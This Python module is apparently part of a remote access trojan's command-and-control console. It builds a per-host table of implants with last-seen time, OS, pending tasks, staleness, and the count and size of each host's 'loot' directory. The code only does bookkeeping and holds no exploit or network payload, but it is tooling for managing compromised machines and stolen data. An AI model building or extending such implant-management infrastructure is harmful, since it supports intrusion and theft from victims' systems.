"""quantum.rat.fleet — fleet snapshot over implants + TASKQ + loot dir.

Pure functions over injected state (no globals): the same code serves the
CLI operator console and the unit tests. Staleness is computed against an
injected now (seconds) so tests are deterministic.
"""
from __future__ import annotations

import os
import time

STALE_AFTER_S = 180


def _loot_stats(loot_dir, host):
    """(file count, total bytes) for a host's loot directory; (0, 0) if none."""
    host_dir = os.path.join(loot_dir, host)
    try:
        names = os.listdir(host_dir)
    except OSError:
        return 0, 0
    total = 0
    count = 0
    for name in names:
        path = os.path.join(host_dir, name)
        try:
            if os.path.isfile(path):
                count += 1
                total += os.path.getsize(path)
        except OSError:
            continue
    return count, total


def is_stale(last_seen_ts, now=None, threshold_s=STALE_AFTER_S):
    """True when the agent hasn't been seen for longer than the threshold."""
    now = time.time() if now is None else now
    try:
        return (now - float(last_seen_ts)) > threshold_s
    except (TypeError, ValueError):
        return True


def snapshot(implants, taskq_hosts, loot_dir="", now=None):
    """Fleet list: one row per known host (implants ∪ queued task hosts).

    implants: {host: {"last_seen": epoch|None, "os": str|None, ...}}
    taskq_hosts: iterable of hosts with a pending task.
    Returns rows sorted by host: {host, os, last_seen, pending, stale,
    loot_files, loot_bytes}.
    """
    now = time.time() if now is None else now
    queued = set(taskq_hosts)
    rows = []
    for host in sorted(set(implants) | queued):
        rec = implants.get(host) or {}
        last_seen = rec.get("last_seen")
        loot_files, loot_bytes = _loot_stats(loot_dir, host)
        rows.append({
            "host": host,
            "os": rec.get("os"),
            "last_seen": last_seen,
            "pending": host in queued,
            "stale": is_stale(last_seen, now=now),
            "loot_files": loot_files,
            "loot_bytes": loot_bytes,
        })
    return rows
